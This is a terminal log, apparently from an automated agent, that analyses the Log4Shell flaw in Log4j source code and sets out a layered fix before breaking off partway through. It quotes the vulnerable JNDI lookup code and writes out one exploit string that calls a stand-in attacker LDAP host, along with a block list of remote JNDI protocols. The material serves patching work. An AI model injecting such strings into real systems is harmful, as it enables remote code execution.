[2;36m                    [0m         [1;36m61[0m[39m:    private [0m[1;35mLog4jWebInitializerImpl[0m[1;39m([0m[39mfinal ServletContext servletContext[0m[1;39m)[0m[39m [0m[1;39m{[0m       [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:        this.servletContext = servletContext;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:    public synchronized void [0m[1;35minitialize[0m[1;39m([0m[1;39m)[0m[39m throws UnavailableException [0m[1;39m{[0m          [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:        if [0m[1;39m([0m[39mthis.deinitialized[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:            throw new [0m[1;35mIllegalStateException[0m[1;39m([0m[32m"Cannot initialize [0m                  [2m                [0m
[2;36m                    [0m         [32mLog4jWebInitializer after it was destroyed."[0m[1;39m)[0m[39m;[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:        [0m[35m/[0m[35m/[0m[39m only do this once[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:        if [0m[1;39m([0m[39m!this.initialized[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:            this.initialized = true;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:            this.name = [0m                                                         [2m                [0m
[2;36m                    [0m         [1;35mthis.substitutor.replace[0m[1;39m([0m[1;35mthis.servletContext.getInitParameter[0m[1;39m([0m[39mLOG4J_CONTEXT_NAME[0m[1;39m)[0m[1;39m)[0m[39m;[0m [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:            final String location = [0m                                             [2m                [0m
[2;36m                    [0m         [1;35mthis.substitutor.replace[0m[1;39m([0m[1;35mthis.servletContext.getInitParameter[0m[1;39m([0m[39mLOG4J_CONFIG_LOCATION[0m [2m                [0m
[2;36m                    [0m         [1;39m)[0m[1;39m)[0m[39m;[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:            final boolean isJndi = [0m                                              [2m                [0m
[2;36m                    [0m         [32m"true"[0m[1;35m.equals[0m[1;39m([0m[1;35mthis.servletContext.getInitParameter[0m[1;39m([0m[39mIS_LOG4J_CONTEXT_SELECTOR_NAMED[0m[1;39m)[0m [2m                [0m
[2;36m                    [0m         [1;39m)[0m[39m;[0m                                                                                  [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:            if [0m[1;39m([0m[39misJndi[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:                [0m[1;35mthis.initializeJndi[0m[1;39m([0m[39mlocation[0m[1;39m)[0m[39m;[0m                                   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.jav[0m[1;92ma:42[0m[39m-[0m[1;36m67[0m     [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:    public [0m[1;35mInterpolator[0m[1;39m([0m[39mfinal StrLookup defaultLookup[0m[1;39m)[0m[39m [0m[1;39m{[0m                         [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:        this.defaultLookup = defaultLookup == null ? new [0m[1;35mMapLookup[0m[1;39m([0m[39mnew [0m          [2m                [0m
[2;36m                    [0m         [39mHashMap<String, String>[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m : defaultLookup;[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:        final PluginManager manager = new [0m[1;35mPluginManager[0m[1;39m([0m[32m"Lookup"[0m[1;39m)[0m[39m;[0m               [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:        [0m[1;35mmanager.collectPlugins[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:        final Map<String, PluginType> plugins = [0m[1;35mmanager.getPlugins[0m[1;39m([0m[1;39m)[0m[39m;[0m            [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:        for [0m[1;39m([0m[39mfinal Map.Entry<String, PluginType> entry : [0m[1;35mplugins.entrySet[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m   [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:            @[0m[1;35mSuppressWarnings[0m[1;39m([0m[32m"unchecked"[0m[1;39m)[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:            final Class<StrLookup> clazz = [0m[1;35mentry.getValue[0m[1;39m([0m[1;39m)[0m[1;35m.getPluginClass[0m[1;39m([0m[1;39m)[0m[39m;[0m    [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:            try [0m[1;39m{[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:                [0m[1;35mlookups.put[0m[1;39m([0m[1;35mentry.getKey[0m[1;39m([0m[1;39m)[0m[39m, [0m[1;35mclazz.newInstance[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:            [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal Exception ex[0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:                [0m[1;35mLOGGER.error[0m[1;39m([0m[32m"Unable to create Lookup for "[0m[39m + [0m[1;35mentry.getKey[0m[1;39m([0m[1;39m)[0m[39m, [0m   [2m                [0m
[2;36m                    [0m         [39mex[0m[1;39m)[0m[39m;[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:     * Create the default Interpolator using only Lookups that work without an [0m  [2m                [0m
[2;36m                    [0m         [39mevent.[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:    public [0m[1;35mInterpolator[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        this.defaultLookup = new [0m[1;35mMapLookup[0m[1;39m([0m[39mnew HashMap<String, String>[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m       [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:        [0m[1;35mlookups.put[0m[1;39m([0m[32m"sys"[0m[39m, new [0m[1;35mSystemPropertiesLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                        [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        [0m[1;35mlookups.put[0m[1;39m([0m[32m"env"[0m[39m, new [0m[1;35mEnvironmentLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:        [0m[1;35mlookups.put[0m[1;39m([0m[32m"jndi"[0m[39m, new [0m[1;35mJndiLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.jav[0m[1;92ma:99[0m[39m-[0m[1;36m124[0m    [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m99[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m100[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, String var[0m[1;39m)[0m[39m [0m[1;39m{[0m                    [2m                [0m
[2;36m                    [0m         [1;36m101[0m[39m:        if [0m[1;39m([0m[39mvar == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m102[0m[39m:            return null;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m103[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m104[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m105[0m[39m:        final int prefixPos = [0m[1;35mvar.indexOf[0m[1;39m([0m[39mPREFIX_SEPARATOR[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m106[0m[39m:        if [0m[1;39m([0m[39mprefixPos >= [0m[1;36m0[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m107[0m[39m:            final String prefix = [0m[1;35mvar.substring[0m[1;39m([0m[1;36m0[0m[39m, prefixPos[0m[1;39m)[0m[39m;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m108[0m[39m:            final String name = [0m[1;35mvar.substring[0m[1;39m([0m[39mprefixPos + [0m[1;36m1[0m[1;39m)[0m[39m;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m109[0m[39m:            final StrLookup lookup = [0m[1;35mlookups.get[0m[1;39m([0m[39mprefix[0m[1;39m)[0m[39m;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m110[0m[39m:            String value = null;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m111[0m[39m:            if [0m[1;39m([0m[39mlookup != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m112[0m[39m:                value = event == null ? [0m[1;35mlookup.lookup[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m : [0m                  [2m                [0m
[2;36m                    [0m         [1;35mlookup.lookup[0m[1;39m([0m[39mevent, name[0m[1;39m)[0m[39m;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m113[0m[39m:            [0m[1;39m}[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m114[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m115[0m[39m:            if [0m[1;39m([0m[39mvalue != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m116[0m[39m:                return value;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m117[0m[39m:            [0m[1;39m}[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m118[0m[39m:            var = [0m[1;35mvar.substring[0m[1;39m([0m[39mprefixPos + [0m[1;36m1[0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m119[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m120[0m[39m:        if [0m[1;39m([0m[39mdefaultLookup != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m121[0m[39m:            return event == null ? [0m[1;35mdefaultLookup.lookup[0m[1;39m([0m[39mvar[0m[1;39m)[0m[39m : [0m                 [2m                [0m
[2;36m                    [0m         [1;35mdefaultLookup.lookup[0m[1;39m([0m[39mevent, var[0m[1;39m)[0m[39m;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m122[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m123[0m[39m:        return null;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m124[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.jav[0m[1;92ma:28[0m[39m-[0m[1;36m35[0m       [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"jndi"[0m[39m, category = [0m[32m"Lookup"[0m[1;39m)[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:public class JndiLookup implements StrLookup [0m[1;39m{[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:    private static boolean ENABLE_JNDI = true;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:    [0m[35m/[0m[39m** JNDI resourcce path prefix used in a J2EE container *[0m[35m/[0m                   [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    static final String CONTAINER_JNDI_RESOURCE_PATH_PREFIX = [0m[32m"java:comp/env/"[0m[39m;[0m  [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.jav[0m[1;92ma:52[0m[39m-[0m[1;36m64[0m       [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:        if [0m[1;39m([0m[39mkey == null || ! ENABLE_JNDI[0m[1;39m)[0m[39m [0m[1;39m{[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        try [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:            InitialContext ctx = new [0m[1;35mInitialContext[0m[1;39m([0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:            return [0m[1;39m([0m[39mString[0m[1;39m)[0m[39m [0m[1;35mctx.lookup[0m[1;39m([0m[1;35mconvertJndiName[0m[1;39m([0m[39mkey[0m[1;39m)[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mNamingException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.jav[0m[1;92ma:73[0m[39m-[0m[1;36m88[0m       [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:    private String [0m[1;35mconvertJndiName[0m[1;39m([0m[39mString jndiName[0m[1;39m)[0m[39m [0m[1;39m{[0m                            [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:        if [0m[1;39m([0m[39m![0m[1;35mjndiName.startsWith[0m[1;39m([0m[39mCONTAINER_JNDI_RESOURCE_PATH_PREFIX[0m[1;39m)[0m[39m && [0m        [2m                [0m
[2;36m                    [0m         [1;35mjndiName.indexOf[0m[1;39m([0m[32m':'[0m[1;39m)[0m[39m == [0m[1;36m-1[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:            jndiName = CONTAINER_JNDI_RESOURCE_PATH_PREFIX + jndiName;[0m           [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:        return jndiName;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:    public static void [0m[1;35msetEnableJndi[0m[1;39m([0m[39mboolean enableJndi[0m[1;39m)[0m[39m [0m[1;39m{[0m                       [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:        ENABLE_JNDI = enableJndi;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:    public static boolean [0m[1;35misEnableJndi[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:        return ENABLE_JNDI;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode_snippets[0m[39m>[0m                                                                    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Fix Strategy[0m                                                                     [2m                [0m
[2;36m                    [0m         [39m<fix_strategy>[0m                                                                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Fix Strategy for Log4j Remote JNDI Lookup Vulnerability[0m                          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### [0m[1;36m1[0m[39m. Analysis Summary[0m                                                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mAfter analyzing the code snippets and evaluation report, I've identified the root [0m  [2m                [0m
[2;36m                    [0m         [39mcause of CVE-[0m[1;36m2021[0m[39m-[0m[1;36m44228[0m[39m [0m[1;39m([0m[39mLog4Shell[0m[1;39m)[0m[39m:[0m                                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Vulnerability Chain:**[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. User-controlled input containing `$[0m[1;39m{[0m[39mjndi:ldap:[0m[35m/[0m[35m/attacker.com/[0m[95mEvil[0m[1;39m}[0m[39m` enters log [0m  [2m                [0m
[2;36m                    [0m         [39mmessages[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. MessagePatternConverter detects `$[0m[1;39m{[0m[39m` and triggers StrSubstitutor[0m                 [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. StrSubstitutor extracts the variable and delegates to Interpolator[0m               [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. Interpolator routes [0m[32m"jndi"[0m[39m prefix to JndiLookup[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m. JndiLookup performs JNDI lookup without validating the URL, allowing remote [0m     [2m                [0m
[2;36m                    [0m         [39mLDAP/RMI connections[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m. Attacker-controlled JNDI server returns malicious objects leading to RCE[0m         [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Key Issues:**[0m                                                                     [2m                [0m
[2;36m                    [0m         [39m- JndiLookup accepts any JNDI URL including remote protocols [0m[1;39m([0m[39mldap:[0m[35m/[0m[35m/[0m[39m, rmi:[0m[35m/[0m[35m/[0m[39m, [0m     [2m                [0m
[2;36m                    [0m         [39mdns:[0m[35m/[0m[35m/[0m[1;39m)[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m- ENABLE_JNDI flag exists but defaults to true and isn't wired to configuration[0m     [2m                [0m
[2;36m                    [0m         [39m- No distinction between safe configuration-time substitution vs unsafe runtime [0m    [2m                [0m
[2;36m                    [0m         [39mmessage substitution[0m                                                                [2m                [0m
[2;36m                    [0m         [39m- JndiLookup was designed for local J2EE resources [0m[1;39m([0m[39mjav[0m[1;92ma:c[0m[39momp/env/*[0m[1;39m)[0m[39m but doesn't [0m   [2m                [0m
[2;36m                    [0m         [39menforce this[0m                                                                        [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### [0m[1;36m2[0m[39m. Multi-Layered Fix Strategy[0m                                                   [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mI will implement defense-in-depth with multiple mitigation layers:[0m                  [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m#### Layer [0m[1;36m1[0m[39m: Restrict JndiLookup to Local Resources Only[0m                           [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**File: `core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java`**[0m [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Modifications:**[0m                                                                  [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. Add URL scheme validation in the `[0m[1;35mlookup[0m[1;39m([0m[1;39m)[0m[39m` method before performing JNDI [0m       [2m                [0m
[2;36m                    [0m         [39moperations[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. Modify `[0m[1;35mconvertJndiName[0m[1;39m([0m[1;39m)[0m[39m` to validate and restrict JNDI URLs to safe local [0m     [2m                [0m
[2;36m                    [0m         [39mcontexts only[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. Reject any URL containing dangerous protocols: ldap:[0m[35m/[0m[35m/[0m[39m, ldaps:[0m[35m/[0m[35m/[0m[39m, rmi:[0m[35m/[0m[35m/[0m[39m, [0m       [2m                [0m
[2;36m                    [0m         [39mdns:[0m[35m/[0m[35m/[0m[39m, iiop:[0m[35m/[0m[35m/[0m[39m, corba:[0m[35m/[0m[35m/[0m                                                           [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Implementation approach:**[0m                                                        [2m                [0m
[2;36m                    [0m         [39m- In `[0m[1;35mlookup[0m[1;39m([0m[1;39m)[0m[39m` method [0m[1;39m([0m[39mafter line [0m[1;36m54[0m[1;39m)[0m[39m, add validation to check if the key contains[0m [2m                [0m
[2;36m                    [0m         [39mdangerous protocols[0m                                                                 [2m                [0m
[2;36m                    [0m         [39m- If dangerous protocol detected, log a warning and return null[0m                     [2m                [0m
[2;36m                    [0m         [39m- In `[0m[1;35mconvertJndiName[0m[1;39m([0m[1;39m)[0m[39m` [0m[1;39m([0m[39mlines [0m[1;36m73[0m[39m-[0m[1;36m79[0m[1;39m)[0m[39m, add explicit checks:[0m                        [2m                [0m
[2;36m                    [0m         [39m  - If jndiName contains [0m[32m"://"[0m[39m and doesn't start with [0m[32m"java:"[0m[39m, reject it[0m            [2m                [0m
[2;36m                    [0m         [39m  - Only allow [0m[32m"java:"[0m[39m scheme for local JNDI contexts[0m                               [2m                [0m
[2;36m                    [0m         [39m  - Maintain backward compatibility for paths without scheme by adding [0m             [2m                [0m
[2;36m                    [0m         [32m"java:comp/env/"[0m[39m prefix[0m                                                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Rationale:** This prevents remote JNDI lookups while preserving legitimate local [0m [2m                [0m
[2;36m                    [0m         [39mJ2EE container resource access as intended by the original design [0m[1;39m([0m[39mevidenced by [0m    [2m                [0m
[2;36m                    [0m         [39mJNDIContextSelector and test cases[0m[1;39m)[0m[39m.[0m                                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m#### Layer [0m[1;36m2[0m[39m: Disable JNDI Lookups by Default with Configuration Override[0m           [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**File: `core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java`**[0m [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Modifications:**[0m                                                                  [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. Change ENABLE_JNDI default from `true` to `false`[0m                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. Add static initializer to read from system property or [0m                          [2m                [0m
[2;36m                    [0m         [39mlog4j2.component.properties[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. Use PropertiesUtil pattern consistent with the codebase[0m                          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Implementation approach:**[0m                                                        [2m                [0m
[2;36m                    [0m         [39m- Replace line [0m[1;36m31[0m[39m's simple declaration with proper initialization[0m                   [2m                [0m
[2;36m                    [0m         [39m- Add static initializer block:[0m                                                     [2m                [0m
[2;36m                    [0m         [39m  ```[0m                                                                               [2m                [0m
[2;36m                    [0m         [39m  static [0m[1;39m{[0m                                                                          [2m                [0m
[2;36m                    [0m         [39m      ENABLE_JNDI = [0m[1;35mPropertiesUtil.getProperties[0m[1;39m([0m[1;39m)[0m                                  [2m                [0m
[2;36m                    [0m         [39m          [0m[1;35m.getBooleanProperty[0m[1;39m([0m[32m"log4j2.enableJndiLookup"[0m[39m, false[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [39m  [0m[1;39m}[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m  ```[0m                                                                               [2m                [0m
[2;36m                    [0m         [39m- This allows users to opt-in via `-Dlog4j2.[0m[33menableJndiLookup[0m[39m=[0m[35mtrue[0m[39m` if needed[0m        [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Rationale:** This follows the principle of secure defaults. Users who need JNDI [0m  [2m                [0m
[2;36m                    [0m         [39mfunctionality can explicitly enable it, and even when enabled, Layer [0m[1;36m1[0m[39m restrictions[0m [2m                [0m
[2;36m                    [0m         [39mprevent remote attacks.[0m                                                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m#### Layer [0m[1;36m3[0m[39m: Add Message Lookup Disable Flag[0m                                       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**File: [0m                                                                            [2m                [0m
[2;36m                    [0m         [39m`core/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter.j[0m [2m                [0m
[2;36m                    [0m         [39mava`**[0m                                                                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Modifications:**[0m                                                                  [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. Add a class-level boolean flag to control message substitution[0m                   [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. Initialize from system property [0m[32m"log4j2.formatMsgNoLookups"[0m                      [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. Skip substitution in `[0m[1;35mformat[0m[1;39m([0m[1;39m)[0m[39m` method when flag is true[0m                         [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Implementation approach:**[0m                                                        [2m                [0m
